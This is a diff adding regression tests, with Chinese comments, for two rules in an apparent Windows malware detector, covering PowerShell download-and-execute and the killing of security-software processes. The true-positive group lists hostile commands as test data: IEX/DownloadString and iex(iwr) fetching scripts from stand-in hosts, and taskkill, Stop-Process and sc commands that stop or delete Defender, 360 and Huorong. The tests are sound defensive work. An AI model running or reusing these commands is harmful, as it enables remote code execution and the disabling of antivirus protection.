@@ -17,6 +17,7 @@
 """
 import io
 import os
+import re
 import sys
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
@@ -1777,6 +1778,125 @@ check("F-022 不就地改写内部列表（不污染内部状态）",
 _m22.integrity = {"status": "changed"}
 check("F-022 当前完整性 changed → **不**标已恢复（不掩盖仍然存在的问题）",
       "resolved" not in _m22._alerts_for_ui()[0])
+
+
+# ============================================================================
+print()
+print("=" * 72)
+print("F-023 P010 / P014 命令行误报 —— 「取数」不等于「执行」、「清理子进程」不等于「杀软」")
+print("=" * 72)
+
+# 背景（2026-10-08 实测，用户反馈"页面全是爆红"的第二批根因）：
+#
+#   P010「命令行内存加载 / 下载执行」原正则把
+#     invoke-webrequest | invoke-restmethod（含缩写 irm/iwr）
+#   与 invoke-expression | iex 归入了同一分支。但两者语义完全相反：
+#     · invoke-expression / iex / downloadstring / frombase64string
+#       = 取回内容后**直接执行** —— 这才是内存加载；
+#     · invoke-restmethod / invoke-webrequest
+#       = 取回内容**当数据用** —— PowerShell 里最标准的 HTTP 客户端。
+#   实测 5 条 critical(82) 全部来自一个 AI 编程辅助工具用 pwsh 调
+#   api.github.com 拉仓库文件清单；命令行里同时有下载 URL 和
+#   [System.Text.UTF8Encoding] 这类**编解码类型名**，于是一网打尽。
+#
+#   P014「命令行终止安全软件进程/服务」原正则的 `/pid\s+\d+` 分支**没有任何前提**，
+#   于是 `taskkill /pid 1234 /f /t` —— 任何程序收尾清理自己拉起的子进程 ——
+#   都被判 critical(92)。实测 3 条命中来自 <workspace>AI.exe 与另一个工具调用。
+#
+# ⚠️ 这一组用例是**双向**的：既断言误报消失（A 组），也断言真检出仍在（B 组）。
+#    只测 A 组的话，"把规则整条删掉"也能通过 —— 那是把误报换成了漏报。
+
+import ast as _ast23   # noqa: E402
+
+_src23 = io.open(os.path.join(os.path.dirname(os.path.abspath(_it22.__file__)),
+                              "rules.py"), encoding="utf-8").read()
+_pats23 = {}
+for _n in _ast23.walk(_ast23.parse(_src23)):
+    if isinstance(_n, _ast23.Assign):
+        for _t in _n.targets:
+            if isinstance(_t, _ast23.Name) and _t.id == "cmd_rules":
+                for _elt in _n.value.elts:
+                    if isinstance(_elt, _ast23.Tuple) and len(_elt.elts) >= 5:
+                        _pats23[_elt.elts[1].value] = (_elt.elts[0].value,
+                                                       _elt.elts[3].value,
+                                                       _elt.elts[4].value)
+
+check("F-023 能从 rules.py 提取到 P010 / P014 正则",
+      "P010" in _pats23 and "P014" in _pats23,
+      f"提取到 {sorted(_pats23)}")
+
+# ---- A 组：实测误报，修复后必须不再命中 -------------------------------
+_FP_CASES = [
+    ("P010", 'pwsh.exe -NoLogo -NoProfile -NonInteractive -Command '
+             '[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false); '
+             '$t=Invoke-RestMethod -Uri "https://api.github.com/repos/HKUDS/'
+             'DeepTutor/contents/SKILL.md?ref=main" -Headers @{"User-Agent"="dsh-agent"}',
+     "AI 工具用 Invoke-RestMethod 拉 GitHub 文件清单"),
+    ("P010", 'powershell -Command Invoke-WebRequest -Uri https://example.com/a.zip '
+             '-OutFile C:\\Users\\<用户名>\\Downloads\\a.zip',
+     "Invoke-WebRequest 下载落盘但不执行"),
+    ("P014", 'taskkill /pid 22180 /f /t', "清理自己的子进程（<workspace>AI 实测）"),
+    ("P014", 'taskkill /T /F /PID 13428', "清理子进程树（实测）"),
+    ("P014", 'taskkill /f /im notepad.exe', "按映像名杀非安全软件"),
+]
+for _rid, _cmd, _desc in _FP_CASES:
+    _hit = bool(re.search(_pats23[_rid][0], _cmd.lower()))
+    check(f"F-023 {_rid} 不再误报：{_desc}", not _hit,
+          ("命中 → 正则仍过宽：" + _pats23[_rid][0][:90]) if _hit else "")
+
+# ---- B 组：银狐真实手法，必须仍然命中（防止用"删规则"换掉误报）-------
+_TP_CASES = [
+    ("P010", 'powershell -NoProfile -Command IEX (New-Object Net.WebClient)'
+             '.DownloadString("http://1.2.3.4/a.ps1")', "IEX + DownloadString 内存执行"),
+    ("P010", 'powershell -Command Invoke-Expression $payload',
+     "Invoke-Expression 执行变量载荷"),
+    ("P010", 'powershell -Command iex (iwr http://evil/a.ps1).Content',
+     "iex 包裹 iwr（取回的字节被直接执行）"),
+    ("P014", 'taskkill /f /im 360tray.exe', "按映像名批量查杀 360"),
+    ("P014", 'taskkill /F /IM huorong.exe /T', "查杀火绒"),
+    ("P014", 'taskkill /im windefend.exe /f', "查杀 Defender 映像"),
+    ("P014", 'Stop-Process -Name msmpeng -Force', "Stop-Process 杀 Defender"),
+    ("P014", 'sc stop windefend', "停 Defender 服务"),
+    ("P014", 'sc delete mdcoresvc', "删 Defender 服务"),
+]
+for _rid, _cmd, _desc in _TP_CASES:
+    _hit = bool(re.search(_pats23[_rid][0], _cmd.lower()))
+    check(f"F-023 {_rid} 仍能检出：{_desc}", _hit, "漏报 → 正则被收得过窄" if not _hit else "")
+
+# ---- 端到端：走 rules_process，确认 P010 在真实进程结构上不误报 ----
+#    单测正则还不够 —— 实测告警里父进程（DeepSeek Harness.exe）也命中了 P010，
+#    因为它把子进程的整条命令行内联进了自己的 cmdline。
+_dsh = mk("DeepSeek Harness.exe",
+          r"D:\DeepSeek-Harness\DeepSeek Harness.exe",
+          cmd=('D:\\DeepSeek-Harness\\DeepSeek Harness.exe '
+               'D:\\DeepSeek-Harness\\resources\\app.asar\\dsh\\node_modules\\'
+               '@deepseek-ai\\dsh-subprocess-local\\lib\\runner.js -- '
+               'C:\\Users\\<用户名>\\AppData\\Local\\Microsoft\\WindowsApps\\pwsh.exe '
+               '-NoLogo -NoProfile -NonInteractive -Command '
+               '[Console]::OutputEncoding = [System.Text.UTF8Encoding]::new($false); '
+               '$t=Invoke-RestMethod -Uri "https://api.github.com/repos/HKUDS/'
+               'DeepTutor/contents/SKILL.md?ref=main" -Headers @{"User-Agent"="dsh-agent"}'))
+_fs_dsh = rules.rules_process(_dsh, _ctx_x)
+check("F-023 内联了子进程命令行的父进程不再命中 P010",
+      not any(f["rule_id"] == "P010" for f in _fs_dsh),
+      f"命中 {[f['rule_id'] for f in _fs_dsh] or '无'}")
+
+# ---- 端到端：真实清理子进程的 taskkill 不再命中 P014 ----
+_tk = mk("taskkill.exe", r"C:\Windows\System32\taskkill.exe",
+         cmd="taskkill /pid 22180 /f /t")
+_fs_tk = rules.rules_process(_tk, _ctx_x)
+check("F-023 清理子进程的 taskkill 不再命中 P014",
+      not any(f["rule_id"] == "P014" for f in _fs_tk),
+      f"命中 {[f['rule_id'] for f in _fs_tk] or '无'}")
+
+# ---- 端到端：真正的杀软查杀必须命中且为 critical ----
+_tk2 = mk("taskkill.exe", r"C:\Windows\System32\taskkill.exe",
+          cmd="taskkill /f /im 360tray.exe")
+_fs_tk2 = rules.rules_process(_tk2, _ctx_x)
+_p14 = next((f for f in _fs_tk2 if f["rule_id"] == "P014"), None)
+check("F-023 按映像名查杀安全软件仍判 critical(92)",
+      _p14 is not None and _p14["severity"] == "critical" and _p14["weight"] == 92,
+      f"{_p14['severity']}/{_p14['weight']}" if _p14 else "漏报")
 
 
 print()
